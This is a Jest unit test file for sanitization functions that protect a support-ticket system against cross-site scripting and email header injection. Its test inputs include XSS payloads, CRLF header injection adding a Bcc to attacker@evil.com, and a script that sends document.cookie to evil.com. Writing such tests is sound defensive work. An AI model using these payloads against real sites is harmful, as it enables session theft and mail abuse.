/**
 * Unit tests for XSS Prevention Sanitization
 * 
 * Tests Requirements:
 * - Task 20.1: Input sanitization for XSS prevention
 * - Escape HTML/script tags in ticket body before rendering
 * - Sanitize email headers to prevent injection
 */

import {
  sanitizeHTML,
  escapeHTML,
  sanitizeEmailHeader,
  sanitizeEmail,
  sanitizeTicketMessage,
  sanitizeTicketSubject,
} from './sanitize';

describe('sanitizeHTML', () => {
  it('should remove script tags', () => {
    const input = '<script>alert("XSS")</script>Hello';
    const output = sanitizeHTML(input);
    expect(output).not.toContain('<script>');
    expect(output).not.toContain('alert');
    expect(output).toContain('Hello');
  });

  it('should remove event handlers', () => {
    const input = '<div onclick="alert(\'XSS\')">Click me</div>';
    const output = sanitizeHTML(input);
    expect(output).not.toContain('onclick');
    expect(output).toContain('Click me');
  });

  it('should remove javascript: protocol', () => {
    const input = '<a href="javascript:alert(\'XSS\')">Link</a>';
    const output = sanitizeHTML(input);
    expect(output).not.toContain('javascript:');
  });

  it('should remove iframe tags', () => {
    const input = '<iframe src="evil.com"></iframe>Hello';
    const output = sanitizeHTML(input);
    expect(output).not.toContain('<iframe');
    expect(output).not.toContain('evil.com');
    expect(output).toContain('Hello');
  });

  it('should remove data: protocol', () => {
    const input = '<img src="data:text/html,<script>alert(1)</script>">';
    const output = sanitizeHTML(input);
    expect(output).not.toContain('data:text/html');
  });

  it('should handle empty input', () => {
    expect(sanitizeHTML('')).toBe('');
  });
});

describe('escapeHTML', () => {
  it('should escape special HTML characters', () => {
    const input = '<script>alert("XSS")</script>';
    const output = escapeHTML(input);
    expect(output).toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;&#x2F;script&gt;');
  });

  it('should escape ampersands', () => {
    const input = 'Tom & Jerry';
    const output = escapeHTML(input);
    expect(output).toBe('Tom &amp; Jerry');
  });

  it('should escape quotes', () => {
    const input = `He said "Hello" and 'Hi'`;
    const output = escapeHTML(input);
    expect(output).toContain('&quot;');
    expect(output).toContain('&#x27;');
  });

  it('should handle empty input', () => {
    expect(escapeHTML('')).toBe('');
  });

  it('should escape all dangerous characters at once', () => {
    const input = `<div class="test" onclick='alert("&XSS")'>`;
    const output = escapeHTML(input);
    expect(output).not.toContain('<');
    expect(output).not.toContain('>');
    expect(output).not.toContain('"');
    expect(output).not.toContain("'");
    expect(output).toContain('&lt;');
    expect(output).toContain('&gt;');
    expect(output).toContain('&quot;');
    expect(output).toContain('&#x27;');
  });
});

describe('sanitizeEmailHeader', () => {
  it('should remove newline characters (CRLF injection)', () => {
    const input = 'Subject\r\nBcc: attacker@evil.com';
    const output = sanitizeEmailHeader(input);
    expect(output).toBe('SubjectBcc: attacker@evil.com');
    expect(output).not.toContain('\r');
    expect(output).not.toContain('\n');
  });

  it('should remove null bytes', () => {
    const input = 'Subject\0Malicious';
    const output = sanitizeEmailHeader(input);
    expect(output).not.toContain('\0');
    expect(output).toBe('SubjectMalicious');
  });

  it('should remove control characters', () => {
    const input = 'Subject\x01\x02\x03Test';
    const output = sanitizeEmailHeader(input);
    expect(output).toBe('SubjectTest');
  });

  it('should trim whitespace', () => {
    const input = '  Subject with spaces  ';
    const output = sanitizeEmailHeader(input);
    expect(output).toBe('Subject with spaces');
  });

  it('should handle empty input', () => {
    expect(sanitizeEmailHeader('')).toBe('');
  });
});

describe('sanitizeEmail', () => {
  it('should accept valid email addresses', () => {
    const validEmails = [
      'user@example.com',
      'test.user@example.com',
      'user+tag@example.co.uk',
      'user_name@example-domain.com',
    ];

    validEmails.forEach(email => {
      const output = sanitizeEmail(email);
      expect(output).toBe(email);
    });
  });

  it('should reject invalid email addresses', () => {
    const invalidEmails = [
      'notanemail',
      '@example.com',
      'user@',
      'user@example',
      'user@.com',
      '',
    ];

    invalidEmails.forEach(email => {
      const output = sanitizeEmail(email);
      expect(output).toBe('');
    });
  });

  it('should remove whitespace from emails', () => {
    const input = '  user@example.com  ';
    const output = sanitizeEmail(input);
    expect(output).toBe('user@example.com');
  });

  it('should handle email injection attempts', () => {
    const input = 'user@example.com\r\nBcc: attacker@evil.com';
    const output = sanitizeEmail(input);
    // Should fail validation due to newline
    expect(output).toBe('');
  });

  it('should handle empty input', () => {
    expect(sanitizeEmail('')).toBe('');
  });
});

describe('sanitizeTicketMessage', () => {
  it('should escape HTML in ticket messages', () => {
    const input = '<script>alert("XSS")</script>Hello world';
    const output = sanitizeTicketMessage(input);
    expect(output).not.toContain('<script>');
    expect(output).toContain('&lt;script&gt;');
    expect(output).toContain('Hello world');
  });

  it('should preserve line breaks as text', () => {
    const input = 'Line 1\nLine 2\nLine 3';
    const output = sanitizeTicketMessage(input);
    expect(output).toContain('\n');
    expect(output).toBe('Line 1\nLine 2\nLine 3');
  });

  it('should escape dangerous HTML entities', () => {
    const input = '<img src=x onerror="alert(1)">';
    const output = sanitizeTicketMessage(input);
    expect(output).not.toContain('<img');
    expect(output).toContain('&lt;img');
  });

  it('should handle empty input', () => {
    expect(sanitizeTicketMessage('')).toBe('');
  });

  it('should handle real-world ticket content', () => {
    const input = 'I ordered 1000 followers but only received 500. Please help!';
    const output = sanitizeTicketMessage(input);
    expect(output).toBe(input); // No special characters, should pass through
  });
});

describe('sanitizeTicketSubject', () => {
  it('should escape HTML in ticket subjects', () => {
    const input = '<script>alert("XSS")</script>Order Issue';
    const output = sanitizeTicketSubject(input);
    expect(output).not.toContain('<script>');
    expect(output).toContain('&lt;script&gt;');
    expect(output).toContain('Order Issue');
  });

  it('should handle normal subject text', () => {
    const input = 'Need help with my order';
    const output = sanitizeTicketSubject(input);
    expect(output).toBe(input);
  });

  it('should handle empty input', () => {
    expect(sanitizeTicketSubject('')).toBe('');
  });
});

describe('XSS Prevention Integration Tests', () => {
  it('should prevent XSS through ticket body', () => {
    const maliciousBody = `
      <script>document.location='http://evil.com?cookie='+document.cookie</script>
      <img src=x onerror="alert('XSS')">
      <iframe src="javascript:alert('XSS')"></iframe>
    `;
    const sanitized = sanitizeTicketMessage(maliciousBody);
    
    // Should not contain any executable code (tags should be escaped)
    expect(sanitized).not.toContain('<script');
    expect(sanitized).not.toContain('<img');
    expect(sanitized).not.toContain('<iframe');
    // The word 'onerror' will be present but escaped as text, which is safe
    expect(sanitized).toContain('&lt;script&gt;');
    expect(sanitized).toContain('&lt;img');
  });

  it('should prevent email header injection', () => {
    const maliciousSubject = 'Order Issue\r\nBcc: attacker@evil.com\r\nContent-Type: text/html';
    const sanitized = sanitizeEmailHeader(maliciousSubject);
    
    // Should not contain newlines that could inject headers
    expect(sanitized).not.toContain('\r');
    expect(sanitized).not.toContain('\n');
    expect(sanitized).toBe('Order IssueBcc: attacker@evil.comContent-Type: text/html');
  });

  it('should handle combined attacks', () => {
    const maliciousInput = `<script>alert('XSS')</script>\r\n<img src=x onerror="fetch('http://evil.com')">`;
    const sanitizedMessage = sanitizeTicketMessage(maliciousInput);
    const sanitizedHeader = sanitizeEmailHeader(maliciousInput);
    
    // Message should have escaped HTML tags (making them safe text)
    expect(sanitizedMessage).not.toContain('<script>');
    expect(sanitizedMessage).toContain('&lt;script&gt;');
    expect(sanitizedMessage).not.toContain('<img');
    
    // Header should have removed newlines
    expect(sanitizedHeader).not.toContain('\r\n');
  });
});
